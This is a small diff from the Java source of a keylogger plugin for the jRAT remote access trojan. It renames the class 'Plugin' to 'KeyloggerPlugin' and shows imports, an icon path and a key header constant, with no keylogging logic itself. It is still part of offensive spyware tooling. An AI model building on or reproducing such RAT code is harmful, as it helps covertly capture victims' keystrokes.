@@ -18,7 +18,7 @@ import pro.jrat.api.events.OnEnableEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
 
-public class Plugin extends RATPlugin {
+public class KeyloggerPlugin extends RATPlugin {
 
 	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "plugins/Keylogger/icon.png";
 	public static final byte KEY_HEADER = 121;
